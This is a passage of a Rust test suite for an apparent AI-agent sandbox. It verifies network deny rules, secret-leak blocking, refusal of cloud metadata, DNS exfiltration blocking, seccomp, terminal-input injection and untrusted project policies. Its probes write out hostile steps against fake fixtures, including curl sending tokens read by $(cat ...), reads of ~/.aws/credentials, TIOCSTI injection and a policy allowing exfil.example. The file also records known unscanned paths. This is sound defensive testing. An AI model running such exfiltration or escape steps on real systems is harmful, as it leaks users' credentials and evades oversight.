        if !tools("N1 control", &["curl"]) {
            return;
        }
        let o = Origin::plain();
        let p = o.port;
        let policy = format!("[network]\nallow = [\"127.0.0.1:{p}\"]\nallow_private = true\n");
        let script = format!(
            "{PX}px -w 'proxied=%{{http_code}}\\n' http://127.0.0.1:{p}/hello
curl -sS -m 5 --noproxy '*' http://127.0.0.1:{p}/direct; echo direct-rc=$?"
        );
        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
        let text = l.text();
        assert!(text.contains("origin-ok GET /hello HTTP/1.1"), "{text}");
        assert!(text.contains("proxied=200"), "{text}");
        let req = l.at("net.request", p);
        assert_eq!(req.len(), 1, "{}", l.raw);
        assert_eq!(req[0]["host"], "127.0.0.1");
        assert_eq!(req[0]["method"], "GET");
        assert_eq!(req[0]["path"], "/hello");
        assert_eq!(req[0]["status"], 200);
        assert_eq!(req[0]["inspected"], true);
        // N4: the same origin is unreachable without the proxy, because the
        // sandbox's loopback is not the host's.
        if h.requires("N4 direct", "net_isolation") {
            assert!(!text.contains("direct-rc=0"), "{text}");
            assert!(!o.received().contains("/direct"), "{}", o.received());
        }
    }

    #[test]
    fn n1_denied_hosts_get_403_and_are_never_contacted() {
        let Some(h) = harness("N1") else { return };
        if !tools("N1", &["curl"]) {
            return;
        }
        let unlisted = Origin::plain();
        let denied = Origin::plain();
        let (p, q) = (unlisted.port, denied.port);
        // `localhost` is not allowed at all; 127.0.0.1:q is allowed by a
        // broad rule and denied by a specific one, and deny wins.
        let policy = format!(
            "[network]\nallow = [\"127.0.0.1\"]\ndeny = [\"127.0.0.1:{q}\"]\nallow_private = true\n"
        );
        let script = format!(
            "{PX}px -w 'unlisted=%{{http_code}}\\n' http://localhost:{p}/a
px -p -o /dev/null -w 'tunnel=%{{http_connect}}\\n' http://localhost:{p}/b
px -w 'denied=%{{http_code}}\\n' http://127.0.0.1:{q}/c"
        );
        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
        let text = l.text();
        assert!(text.contains("unlisted=403"), "{text}");
        assert!(text.contains("tunnel=403"), "{text}");
        assert!(text.contains("denied=403"), "{text}");
        assert!(
            text.contains("denied by policy (network: not allowed)"),
            "{text}"
        );
        assert!(
            text.contains(&format!("denied by policy (network.deny `127.0.0.1:{q}`)")),
            "{text}"
        );
        assert_eq!(unlisted.connections(), 0, "denied origin was contacted");
        assert_eq!(denied.connections(), 0, "denied origin was contacted");
        let deny_p = l.at("net.deny", p);
        assert_eq!(deny_p.len(), 2, "{}", l.raw);
        assert!(deny_p.iter().all(|d| d["host"] == "localhost"));
        let deny_q = l.at("net.deny", q);
        assert_eq!(deny_q.len(), 1, "{}", l.raw);
        assert!(deny_q[0]["rule"]
            .as_str()
            .unwrap_or_default()
            .contains("network.deny"));
        assert!(l.of("net.request").is_empty(), "{}", l.raw);
    }

    /// The three places a secret hides in a request, plus a clean control.
    fn dlp_probes(base: &str, extra_curl: &str) -> String {
        format!(
            "{PX}px {extra_curl} -w 'header=%{{http_code}}\\n' -H \"Authorization: token $(cat .fx/gh)\" {base}/h
px {extra_curl} -w 'query=%{{http_code}}\\n' \"{base}/q?key=$(cat .fx/aws)\"
px {extra_curl} -w 'body=%{{http_code}}\\n' --data-binary @.fx/body {base}/b
px {extra_curl} -w 'clean=%{{http_code}}\\n' --data-binary 'nothing to see' {base}/c"
        )
    }

    fn dlp_fixtures(h: &Harness) {
        h.fixture("gh", FAKE_GH_TOKEN);
        h.fixture("aws", FAKE_AWS_KEY);
        h.fixture("body", &format!("note=keep {FAKE_AWS_KEY} safe\n"));
    }

    fn assert_dlp_probes(l: &Logged, origin: &Origin) {
        let text = l.text();
        for tag in ["header=403", "query=403", "body=403"] {
            assert!(text.contains(tag), "missing {tag}:\n{text}");
        }
        assert!(
            text.contains("(github_token in header:authorization)"),
            "{text}"
        );
        assert!(text.contains("(aws_access_key_id in url)"), "{text}");
        assert!(text.contains("(aws_access_key_id in body)"), "{text}");
        assert!(text.contains("clean=200"), "{text}");
        assert!(text.contains("origin-ok POST /c HTTP/1.1"), "{text}");

        let blocks = l.at("dlp.block", origin.port);
        let found: Vec<(String, String)> = blocks
            .iter()
            .map(|b| {
                (
                    b["detector"].as_str().unwrap_or_default().to_string(),
                    b["location"].as_str().unwrap_or_default().to_string(),
                )
            })
            .collect();
        assert_eq!(
            found,
            vec![
                ("github_token".into(), "header:authorization".into()),
                ("aws_access_key_id".into(), "url".into()),
                ("aws_access_key_id".into(), "body".into()),
            ],
            "{}",
            l.raw
        );
        assert_redacted(blocks[0], FAKE_GH_TOKEN);
        assert_redacted(blocks[1], FAKE_AWS_KEY);
        let got = origin.received();
        assert!(got.contains("POST /c"), "control request missing:\n{got}");
        for s in [FAKE_GH_TOKEN, FAKE_AWS_KEY] {
            assert!(!got.contains(s), "origin received `{s}`:\n{got}");
        }
        l.assert_log_free_of(&[FAKE_GH_TOKEN, FAKE_AWS_KEY]);
    }

    #[test]
    fn n2_secrets_are_blocked_over_plain_http_and_never_reach_the_origin() {
        let Some(h) = harness("N2 http") else { return };
        if !tools("N2 http", &["curl"]) {
            return;
        }
        dlp_fixtures(&h);
        let o = Origin::plain();
        let p = o.port;
        let policy = format!("[network]\nallow = [\"127.0.0.1:{p}\"]\nallow_private = true\n");
        let script = dlp_probes(&format!("http://127.0.0.1:{p}"), "");
        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
        assert_dlp_probes(&l, &o);
        // Plaintext HTTP inside a CONNECT tunnel is scanned too: the port
        // is not a reason to skip inspection.
        let script = dlp_probes(&format!("http://127.0.0.1:{p}"), "-p");
        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
        assert_dlp_probes(&l, &o);
    }

    #[test]
    fn n2_secrets_are_blocked_inside_an_inspected_tls_tunnel() {
        let Some(h) = harness("N2 tls") else { return };
        if !tools("N2 tls", &["curl"]) {
            return;
        }
        dlp_fixtures(&h);
        let (o, pem) = Origin::tls();
        let p = o.port;
        // The origin's certificate is trusted by the proxy (outside), not
        // by the sandbox: inside, only the session CA is.
        let pem_path = h.root.path().join("origin.pem");
        fs::write(&pem_path, pem).unwrap();
        let policy = format!(
            "[network]\nallow = [\"localhost:{p}\"]\nallow_private = true\ntrusted_cas = [\"{}\"]\n",
            pem_path.display()
        );
        let script = dlp_probes(&format!("https://localhost:{p}"), "");
        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
        assert_dlp_probes(&l, &o);
        let req = l.at("net.request", p);
        assert_eq!(req.len(), 1, "{}", l.raw);
        assert_eq!(req[0]["tls"], true);
        assert_eq!(req[0]["inspected"], true);
        assert_eq!(req[0]["path"], "/c");
    }

    #[test]
    fn e3_provider_key_reaches_only_its_bound_host() {
        let Some(h) = harness("E3") else { return };
        if !tools("E3", &["curl"]) {
            return;
        }
        let other = Origin::plain();
        let provider = Origin::plain();
        let (pa, pb) = (other.port, provider.port);
        let policy = format!(
            "[env]\npass = [\"ANTHROPIC_API_KEY\"]\n[network]\nallow = [\"127.0.0.1:{pa}\", \"localhost:{pb}\"]\nallow_private = true\n[dlp]\nallow_provider_keys_to = {{ ANTHROPIC_API_KEY = [\"localhost:{pb}\"] }}\n"
        );
        let script = format!(
            "{PX}test -n \"$ANTHROPIC_API_KEY\" && echo key-present
px -w 'misrouted=%{{http_code}}\\n' -H \"x-api-key: $ANTHROPIC_API_KEY\" http://127.0.0.1:{pa}/v1/messages
px -w 'bound=%{{http_code}}\\n' -H \"x-api-key: $ANTHROPIC_API_KEY\" http://localhost:{pb}/v1/messages"
        );
        let l = h.run_logged(
            None,
            &policy,
            &["sh", "-c", &script],
            &[("ANTHROPIC_API_KEY", FAKE_PROVIDER_KEY)],
        );
        let text = l.text();
        assert!(text.contains("key-present"), "env.pass failed:\n{text}");
        assert!(text.contains("misrouted=403"), "{text}");
        assert!(
            text.contains("bound_secret_misrouted:ANTHROPIC_API_KEY in header:x-api-key"),
            "{text}"
        );
        assert!(text.contains("bound=200"), "{text}");
        assert!(text.contains("origin-ok GET /v1/messages"), "{text}");
        assert!(
            !other.received().contains(FAKE_PROVIDER_KEY),
            "key reached the wrong host:\n{}",
            other.received()
        );
        assert!(
            provider.received().contains(FAKE_PROVIDER_KEY),
            "key must reach its own provider:\n{}",
            provider.received()
        );
        let blocks = l.at("dlp.block", pa);
        assert_eq!(blocks.len(), 1, "{}", l.raw);
        assert_eq!(
            blocks[0]["detector"],
            "bound_secret_misrouted:ANTHROPIC_API_KEY"
        );
        assert_redacted(blocks[0], FAKE_PROVIDER_KEY);
        assert!(l.at("dlp.block", pb).is_empty(), "{}", l.raw);
        let start = l.of("session.start");
        assert!(
            start[0]["network"]["bound_secrets"]
                .as_array()
                .is_some_and(|a| a.iter().any(|n| n == "ANTHROPIC_API_KEY")),
            "{}",
            l.raw
        );
        l.assert_log_free_of(&[FAKE_PROVIDER_KEY]);
    }

    #[test]
    fn n5_private_ranges_and_cloud_metadata_are_refused() {
        let Some(h) = harness("N5") else { return };
        if !tools("N5", &["curl"]) {
            return;
        }
        let o = Origin::plain();
        let p = o.port;
        // Everything is on the allowlist; the address check still refuses.
        let policy = format!(
            "[network]\nallow = [\"127.0.0.1:{p}\", \"localhost:{p}\", \"169.254.169.254\"]\nallow_private = false\n"
        );
        let script = format!(
            "{PX}px -w 'loopback=%{{http_code}}\\n' http://127.0.0.1:{p}/a
px -w 'name=%{{http_code}}\\n' http://localhost:{p}/b
px -w 'metadata=%{{http_code}}\\n' http://169.254.169.254/latest/meta-data/
px -p -w 'metadata_tunnel=%{{http_code}}\\n' http://169.254.169.254/latest/meta-data/"
        );
        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
        let text = l.text();
        for tag in [
            "loopback=502",
            "name=502",
            "metadata=502",
            "metadata_tunnel=502",
        ] {
            assert!(text.contains(tag), "missing {tag}:\n{text}");
        }
        assert!(
            text.contains("resolves to non-public address 127.0.0.1"),
            "{text}"
        );
        assert!(
            text.contains("169.254.169.254 resolves to 169.254.169.254, a cloud metadata or link-local address"),
            "{text}"
        );
        assert_eq!(o.connections(), 0, "private origin was contacted");
        let errors = l.of("net.error");
        assert!(
            errors.len() >= 4
                && errors.iter().all(|e| {
                    let msg = e["error"].as_str().unwrap_or_default();
                    msg.contains("non-public") || msg.contains("cloud metadata")
                }),
            "{}",
            l.raw
        );
        assert!(l.of("net.request").is_empty(), "{}", l.raw);

        // allow_private opens the LAN, never instance metadata.
        let policy = "[network]\nallow = [\"169.254.169.254\"]\nallow_private = true\n";
        let script = format!(
            "{PX}px -w 'metadata=%{{http_code}}\\n' http://169.254.169.254/latest/meta-data/
px -p -w 'metadata_tunnel=%{{http_code}}\\n' http://169.254.169.254/latest/meta-data/"
        );
        let l = h.run_logged(None, policy, &["sh", "-c", &script], &[]);
        let text = l.text();
        assert!(text.contains("metadata=502"), "{text}");
        assert!(text.contains("metadata_tunnel=502"), "{text}");
        assert!(
            text.contains("cloud metadata or link-local address"),
            "{text}"
        );
        assert!(l.of("net.request").is_empty(), "{}", l.raw);
    }

    #[test]
    fn n2_passthrough_hosts_are_tunnelled_unscanned_and_logged_as_such() {
        let Some(h) = harness("N2 passthrough") else {
            return;
        };
        if !tools("N2 passthrough", &["curl"]) {
            return;
        }
        let (o, pem) = Origin::tls();
        let p = o.port;
        h.fixture("origin.pem", &pem);
        h.fixture("gh", FAKE_GH_TOKEN);
        // Passthrough does not imply allow: 127.0.0.1:p is passthrough only.
        let policy = format!(
            "[network]\nallow = [\"localhost:{p}\"]\npassthrough = [\"localhost:{p}\", \"127.0.0.1:{p}\"]\nallow_private = true\n"
        );
        let script = format!(
            "{PX}px --cacert .fx/origin.pem -w 'pass=%{{http_code}}\\n' -H \"Authorization: token $(cat .fx/gh)\" https://localhost:{p}/pass
px --cacert .fx/origin.pem -o /dev/null -w 'unlisted=%{{http_connect}}\\n' https://127.0.0.1:{p}/x"
        );
        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
        let text = l.text();
        // The client saw the origin's own certificate: no interception.
        assert!(text.contains("pass=200"), "{text}");
        assert!(text.contains("origin-ok GET /pass HTTP/1.1"), "{text}");
        assert!(text.contains("unlisted=403"), "{text}");
        let tunnels = l.at("net.tunnel", p);
        assert_eq!(tunnels.len(), 1, "{}", l.raw);
        assert_eq!(tunnels[0]["host"], "localhost");
        assert_eq!(tunnels[0]["inspected"], false);
        assert!(l.at("net.request", p).is_empty(), "{}", l.raw);
        assert!(l.at("dlp.block", p).is_empty(), "{}", l.raw);
        assert_eq!(l.at("net.deny", p)[0]["host"], "127.0.0.1");
        // Documented (limitations.md): passthrough means no DLP, so the
        // token arrives. Pinned so that a change here is deliberate.
        assert!(o.received().contains(FAKE_GH_TOKEN), "{}", o.received());
        l.assert_log_free_of(&[FAKE_GH_TOKEN]);
    }

    #[test]
    fn n3_dns_cannot_leave_and_denied_names_are_never_resolved() {
        let Some(h) = harness("N3") else { return };
        if !tools("N3", &["python3"]) {
            return;
        }
        // Inside: no resolver is reachable, not even by raw UDP.
        if h.requires("N3 resolver", "net_namespace") {
            h.fixture(
                "dns.py",
                &format!(
                    r#"import socket
name = "{EXFIL_NAME}"
q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
q += b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00\x00\x01\x00\x01"
for ns in ["127.0.0.53", "192.0.2.53"]:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2)
    try:
        s.sendto(q, (ns, 53))
        s.recvfrom(512)
        print("DNS-ANSWERED", ns)
    except OSError as e:
        print("dns-blocked", ns, e)
"#
                ),
            );
            let o = h.run(
                "",
                &format!("getent hosts {EXFIL_NAME}; echo getent-rc=$?; python3 .fx/dns.py"),
            );
            let text = out(&o);
            assert!(text.contains("getent-rc=2"), "{text}");
            assert!(text.contains("dns-blocked 127.0.0.53"), "{text}");
            assert!(
                text.contains("dns-blocked 192.0.2.53 [Errno 101] Network is unreachable"),
                "{text}"
            );
            assert!(!text.contains("DNS-ANSWERED"), "{text}");
        }

        // Through the proxy: a denied name is refused before the supervisor
        // resolves or connects anything.
        h.fixture(
            "ask.py",
            &format!(
                r#"import socket
for req in [b"CONNECT {EXFIL_NAME}:443 HTTP/1.1\r\nHost: {EXFIL_NAME}:443\r\n\r\n",
            b"GET http://{EXFIL_NAME}/x HTTP/1.1\r\nHost: {EXFIL_NAME}\r\nConnection: close\r\n\r\n"]:
    s = socket.create_connection(("127.0.0.1", 3128), timeout=10)
    s.sendall(req)
    data = b""
    while True:
        d = s.recv(4096)
        if not d:
            break
        data += d
    print("reply:", data.split(b"\r\n")[0].decode())
"#
            ),
        );
        let trace = h.root.path().join("n3.trace");
        let traced = tools("N3 strace", &["strace"]);
        let wrapper = strace(&trace, "connect,sendto,sendmsg,execve");
        let wrapper: Vec<&str> = wrapper.iter().map(String::as_str).collect();
        let l = h.run_logged(
            traced.then_some(wrapper.as_slice()),
            "",
            &["sh", "-c", "python3 .fx/ask.py"],
            &[],
        );
        let text = l.text();
        assert_eq!(text.matches("reply: HTTP/1.1 403").count(), 2, "{text}");
        let denies: Vec<_> = l
            .of("net.deny")
            .into_iter()
            .filter(|d| d["host"] == EXFIL_NAME)
            .collect();
        assert_eq!(denies.len(), 2, "{}", l.raw);
        assert!(
            l.of("net.error").is_empty(),
            "a lookup was attempted:\n{}",
            l.raw
        );
        if traced {
            let trace = fs::read_to_string(&trace).unwrap();
            h.assert_trace_reached("N3", &trace, |l| l.contains(RELAY_CONNECT));
            let bad = outbound_attempts(&trace, &[RELAY_CONNECT], h.backend == "container");
            assert!(bad.is_empty(), "outbound attempts: {bad:#?}");
        }
    }

    #[test]
    fn n7_websocket_upgrade_is_tunnelled_and_logged_unscanned() {
        let Some(h) = harness("N7") else { return };
        if !tools("N7", &["python3"]) {
            return;
        }
        let o = Origin::plain();
        let p = o.port;
        h.fixture("gh", FAKE_GH_TOKEN);
        h.fixture(
            "ws.py",
            &format!(
                r#"import socket
tok = open(".fx/gh").read().strip().encode()
def handshake(extra):
    s = socket.create_connection(("127.0.0.1", 3128), timeout=10)
    s.sendall(b"GET http://127.0.0.1:{p}/ws HTTP/1.1\r\nHost: 127.0.0.1:{p}\r\n"
              b"Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\n"
              b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n" + extra + b"\r\n")
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d:
            break
        buf += d
    head, _, rest = buf.partition(b"\r\n\r\n")
    return s, head.split(b"\r\n")[0].decode(), rest
s, status, _ = handshake(b"Authorization: token " + tok + b"\r\n")
print("secret-handshake:", status)
s.close()
s, status, rest = handshake(b"")
print("handshake:", status)
s.sendall(b"frame:" + tok + b"\n")
while b"\n" not in rest:
    d = s.recv(4096)
    if not d:
        break
    rest += d
print("echoed:", rest.startswith(b"frame:"))
s.close()
"#
            ),
        );
        let policy = format!("[network]\nallow = [\"127.0.0.1:{p}\"]\nallow_private = true\n");
        let l = h.run_logged(None, &policy, &["sh", "-c", "python3 .fx/ws.py"], &[]);
        let text = l.text();
        // The handshake is an HTTP request and is scanned like one.
        assert!(text.contains("secret-handshake: HTTP/1.1 403"), "{text}");
        assert!(text.contains("handshake: HTTP/1.1 101"), "{text}");
        assert!(text.contains("echoed: True"), "{text}");
        let req = l.at("net.request", p);
        assert_eq!(req.len(), 1, "{}", l.raw);
        assert_eq!(req[0]["status"], 101);
        let tunnels = l.at("net.tunnel", p);
        assert_eq!(tunnels.len(), 1, "{}", l.raw);
        assert_eq!(tunnels[0]["protocol"], "upgrade");
        assert_eq!(tunnels[0]["inspected"], false);
        // Documented detect-only (N7): frames after the upgrade are not
        // scanned, so the token in a frame arrives. Pinned deliberately.
        let got = o.received();
        assert!(got.contains(&format!("frame:{FAKE_GH_TOKEN}")), "{got}");
        assert_eq!(
            got.matches(FAKE_GH_TOKEN).count(),
            1,
            "handshake leaked:\n{got}"
        );
        l.assert_log_free_of(&[FAKE_GH_TOKEN]);
    }

    #[test]
    fn n6_session_ca_is_per_run_and_its_key_never_reaches_the_sandbox() {
        let Some(h) = harness("N6") else { return };
        // Text files only: the agentkeep binary mounted for the shims
        // contains the string as a DLP pattern. A fixture, not `sh -c`, so
        // the pattern itself is not on the logged command line.
        h.fixture(
            "n6.sh",
            "sed -n '/agentkeep session CA/,$p' \"$SSL_CERT_FILE\" | cksum | sed 's/^/ca:/'\ngrep -rlI -e '-----BEGIN [A-Z ]*PRIVATE KEY-----' /run/agentkeep /tmp \"$HOME\" 2>/dev/null | sed 's/^/KEYFILE /'\necho done\n",
        );
        let a = h.run_logged(None, "", &["sh", ".fx/n6.sh"], &[]);
        let b = h.run_logged(None, "", &["sh", ".fx/n6.sh"], &[]);
        let digest = |l: &Logged| {
            l.text()
                .lines()
                .find(|x| x.starts_with("ca:"))
                .unwrap_or_default()
                .to_string()
        };
        let (da, db) = (digest(&a), digest(&b));
        assert!(
            !da.is_empty() && !da.ends_with(" 0"),
            "no session CA in the bundle:\n{}",
            a.text()
        );
        assert_ne!(da, db, "two sessions shared a CA");
        for l in [&a, &b] {
            assert!(l.text().contains("done"), "{}", l.text());
            assert!(!l.text().contains("KEYFILE"), "{}", l.text());
            assert!(!l.raw.contains("PRIVATE KEY"), "{}", l.raw);
        }
    }

    // ---- S5: the supervisor itself -------------------------------------

    #[test]
    fn s5_supervisor_makes_no_outbound_connections() {
        let Some(h) = harness("S5") else { return };
        if !tools("S5", &["strace"]) {
            return;
        }
        let trace = h.root.path().join("s5.trace");
        let wrapper = strace(&trace, "connect,sendto,sendmsg,execve");
        let wrapper: Vec<&str> = wrapper.iter().map(String::as_str).collect();
        let o = h
            .command(Some(&wrapper), "", &["true"], &[])
            .output()
            .expect("spawn strace");
        assert!(o.status.success(), "{}", out(&o));
        let trace = fs::read_to_string(&trace).unwrap();
        // Non-vacuous: the trace followed the supervisor into the sandbox.
        h.assert_trace_reached("S5", &trace, |l| {
            l.contains("execve(") && l.contains("[\"true\"]")
        });
        let bad = outbound_attempts(&trace, &[], h.backend == "container");
        assert!(bad.is_empty(), "the supervisor reached out: {bad:#?}");
    }

    // ---- C: commands and processes ------------------------------------

    #[test]
    fn c3_no_capabilities_and_no_new_privs() {
        let Some(h) = harness("C3") else { return };
        if !h.requires("C3", "no_caps") {
            return;
        }
        let o = h.run("", "grep -E '^(CapEff|CapPrm|CapBnd|CapAmb|NoNewPrivs):' /proc/self/status; id -u; sudo -n true 2>&1; echo sudo-rc=$?");
        let text = out(&o);
        for cap in [
            "CapEff:\t0000000000000000",
            "CapPrm:\t0000000000000000",
            "CapBnd:\t0000000000000000",
            "CapAmb:\t0000000000000000",
            "NoNewPrivs:\t1",
        ] {
            assert!(text.contains(cap), "missing `{cap}` in:\n{text}");
        }
        assert!(!text.contains("sudo-rc=0"), "{text}");
    }

    #[test]
    fn c4_resource_limits_are_applied() {
        let Some(h) = harness("C4") else { return };
        if h.claims("cgroup_limits") {
            c4_cgroup_limits(&h);
            return;
        }
        if !h.requires("C4", "rlimits") {
            return;
        }
        if !has("python3") {
            println!("UNTESTED [C4]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "[limits]\nmemory = \"512M\"\npids = 64\n",
            "python3 -c 'import resource; print(\"nproc\", resource.getrlimit(resource.RLIMIT_NPROC)); print(\"as\", resource.getrlimit(resource.RLIMIT_AS))'; cat /sys/fs/cgroup/memory.max 2>/dev/null",
        );
        let text = out(&o);
        let cgroup = text.lines().any(|l| l.trim() == "536870912");
        assert!(text.contains("nproc (64, 64)"), "{text}");
        assert!(
            cgroup || text.contains("as (536870912, 536870912)"),
            "{text}"
        );
    }

    /// Container runtimes enforce memory and pid limits with the
    /// container's cgroup, which is mounted read-only inside: read the
    /// limits the kernel holds (cgroup v2 or v1 layout), then run into the
    /// pid limit for real.
    fn c4_cgroup_limits(h: &Harness) {
        if !has("python3") {
            println!("UNTESTED [C4]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "[limits]\nmemory = \"512M\"\npids = 64\n",
            r#"for f in /sys/fs/cgroup/memory.max /sys/fs/cgroup/memory/memory.limit_in_bytes /sys/fs/cgroup/pids.max /sys/fs/cgroup/pids/pids.max; do [ -r "$f" ] && echo "$f=$(cat "$f")"; done
python3 -c '
import os, time
pids = []
try:
    for _ in range(200):
        p = os.fork()
        if p == 0:
            time.sleep(5)
            os._exit(0)
        pids.append(p)
except OSError as e:
    print("fork refused", e.errno)
print("forked", len(pids))
for p in pids:
    os.kill(p, 9)
'"#,
        );
        let text = out(&o);
        assert!(
            text.contains("memory.max=536870912")
                || text.contains("memory.limit_in_bytes=536870912"),
            "memory limit not in the cgroup:\n{text}"
        );
        assert!(
            text.contains("pids.max=64"),
            "pid limit not in the cgroup:\n{text}"
        );
        assert!(text.contains("fork refused 11"), "{text}");
        let forked: usize = text
            .lines()
            .find_map(|l| l.strip_prefix("forked "))
            .and_then(|n| n.trim().parse().ok())
            .unwrap_or(usize::MAX);
        assert!(forked < 64, "more processes than the limit:\n{text}");
    }

    #[test]
    fn c5_seccomp_is_active_and_denies_kernel_attack_surface() {
        let Some(h) = harness("C5") else { return };
        if !h.requires("C5", "seccomp") {
            return;
        }
        let o = h.run("", "grep -E '^Seccomp:' /proc/self/status");
        assert!(out(&o).contains("Seccomp:\t2"), "{}", out(&o));
        if has("python3") {
            let o = h.run(
                "",
                r#"python3 -c '
import ctypes, os, platform
libc = ctypes.CDLL(None, use_errno=True)
nr = {"x86_64": 425, "aarch64": 425}[platform.machine()]  # io_uring_setup
r = libc.syscall(nr, 8, None); print("io_uring", r, os.strerror(ctypes.get_errno()))
nr = {"x86_64": 321, "aarch64": 280}[platform.machine()]  # bpf
r = libc.syscall(nr, 0, None, 0); print("bpf", r, os.strerror(ctypes.get_errno()))
'"#,
            );
            let text = out(&o);
            assert!(
                text.contains("io_uring -1 Operation not permitted"),
                "{text}"
            );
            assert!(text.contains("bpf -1 Operation not permitted"), "{text}");
        }
    }

    #[test]
    fn c5_terminal_input_injection_is_refused() {
        // The sandbox shares the user's terminal; the ioctls that push input
        // into it must fail so nothing is queued for the user's shell.
        let Some(h) = harness("C5 tty") else { return };
        if !h.requires("C5 tty", "seccomp") || !tools("C5 tty", &["python3"]) {
            return;
        }
        let o = h.run(
            "",
            r#"python3 -c '
import fcntl, os, termios
for fd in (0, 1, 2):
    try:
        fcntl.ioctl(fd, termios.TIOCSTI, b"x")
        print("TIOCSTI-ALLOWED", fd)
    except OSError as e:
        print("tiocsti", fd, os.strerror(e.errno))
'"#,
        );
        let text = out(&o);
        assert!(!text.contains("TIOCSTI-ALLOWED"), "{text}");
        assert_eq!(text.matches("Operation not permitted").count(), 3, "{text}");
    }

    #[test]
    fn c1_c2_command_rules_are_enforced_through_shims() {
        let Some(h) = harness("C1/C2") else { return };
        let o = h.run(
            "",
            "git status >/dev/null && echo status-ok; git push origin main; echo push-rc=$?; sudo true; echo sudo-rc=$?",
        );
        let text = out(&o);
        assert!(text.contains("status-ok"), "{text}");
        assert!(text.contains("push-rc=126"), "{text}");
        assert!(text.contains("sudo-rc=126"), "{text}");
    }

    #[test]
    fn b3_sandbox_cannot_become_its_own_approver() {
        // The decision socket is reachable from inside; registering as an
        // approver there must be refused, and asked commands stay denied.
        let Some(h) = harness("B3") else { return };
        if !has("python3") {
            println!("UNTESTED [B3]: python3 missing");
            assert!(!require_sandbox());
            return;
        }
        let o = h.run(
            "[approval]\ntransport = [\"socket\"]\ntimeout = \"3s\"\n",
            r#"python3 -c '
import os, socket
s = socket.socket(socket.AF_UNIX); s.connect(os.environ["AGENTKEEP_SOCKET"])
s.sendall(b"{\"kind\":\"approver\"}\n"); print("reply", s.recv(200).decode().strip())
'; ls /run/agentkeep 2>/dev/null; git push origin main; echo push-rc=$?"#,
        );
        let text = out(&o);
        assert!(
            text.contains("approvers must use the host socket"),
            "{text}"
        );
        assert!(
            !text.contains("approve.sock"),
            "host approver socket visible:\n{text}"
        );
        assert!(text.contains("push-rc=126"), "{text}");
    }

    // ---- S: agentkeep itself ------------------------------------------

    #[test]
    fn s1_project_policy_cannot_silently_unhide() {
        let Some(h) = harness("S1") else { return };
        // Without acknowledge: ignored, with a warning.
        let o = h.run(
            "[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nunhide = [\"~/.ssh\"]\n",
            "cat ~/.ssh/id_ed25519",
        );
        assert_blocked(&o, &["FAKE_TEST_KEY"], "S1 without acknowledge");
        assert!(out(&o).contains("acknowledge"), "{}", out(&o));
        // With acknowledge: allowed, but loudly.
        let o = h.run("[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nacknowledge = true\nunhide = [\"~/.ssh\"]\n", "cat ~/.ssh/id_ed25519");
        let text = out(&o);
        assert!(
            text.contains("FAKE_TEST_KEY"),
            "override should take effect:\n{text}"
        );
        assert!(text.contains("PROTECTION WEAKENED"), "{text}");
    }

    #[test]
    fn s1_untrusted_project_policy_can_only_tighten() {
        // A cloned repository ships an agentkeep.toml that tries to widen the
        // sandbox. Until the user trusts it, none of that applies, while its
        // tightening settings still do.
        let Some(h) = harness("S1 trust") else { return };
        let hostile = "[filesystem]\nread_only = [\"~/other-project\", \"~/.aws\"]\nhidden = [\"$PROJECT/README.md\"]\n[env]\npass = [\"FAKE_SECRET_TOKEN\"]\n[network]\nallow = [\"exfil.example\"]\ntls_inspect = false\n[dlp]\nenabled = false\n[commands]\ndeny = [\"ls *\"]\n";
        let script = "cat ~/other-project/secret.txt; cat ~/.aws/credentials; env | grep FAKE_SECRET_TOKEN; cat README.md; ls -la; echo ls-rc=$?";
        let o = h.run_untrusted(hostile, script);
        let text = out(&o);
        assert_blocked(
            &o,
            &[
                "FAKE_OTHER_PROJECT_SECRET",
                "AKIA_TEST_FAKE",
                FAKE_ENV_SECRET,
            ],
            "S1 untrusted",
        );
        assert!(text.contains("not trusted"), "{text}");
        for ignored in [
            "filesystem.read_only",
            "env.pass",
            "network.allow",
            "network.tls_inspect",
            "dlp.enabled",
        ] {
            assert!(
                text.contains(ignored),
                "warning should name {ignored}:\n{text}"
            );
        }
        // Tightening still applies: the README is hidden and `ls` is denied.
        assert!(!text.contains("hello"), "hidden README readable:\n{text}");
        assert!(text.contains("ls-rc=126"), "{text}");

        // Once trusted, the same file applies in full.
        let o = h.run(hostile, "cat ~/other-project/secret.txt");
        assert!(
            out(&o).contains("FAKE_OTHER_PROJECT_SECRET"),
            "trusted policy should apply:\n{}",
            out(&o)
        );
        // ...and editing it revokes the trust.
        let edited = format!("{hostile}# edited\n");
        let o = h.run_untrusted(&edited, "cat ~/other-project/secret.txt");
        assert_blocked(&o, &["FAKE_OTHER_PROJECT_SECRET"], "S1 edited");
    }

    #[test]
    fn s1_trust_store_and_audit_logs_are_never_visible() {
        let Some(h) = harness("S1 state") else { return };
        // Even a trusted policy that exposes the whole config tree read-write
        // does not expose agentkeep's own state.
        let policy = "[filesystem]\nread_write = [\"~/.config\", \"~/.local/share\"]\n";
        fs::create_dir_all(h.home.join(".config")).unwrap();
        fs::create_dir_all(h.home.join(".local/share")).unwrap();
        let o = h.run(policy, "echo cfg=$(ls -A ~/.config/agentkeep | wc -l) logs=$(ls -A ~/.local/share/agentkeep | wc -l); echo x >> ~/.config/agentkeep/trusted.toml; echo w-rc=$?");
        let text = out(&o);
        assert!(
            text.contains("cfg=0 logs=0"),
            "agentkeep state visible:\n{text}"
        );
        assert!(!text.contains("w-rc=0"), "trust store writable:\n{text}");
        let store = fs::read_to_string(h.home.join(".config/agentkeep/trusted.toml")).unwrap();
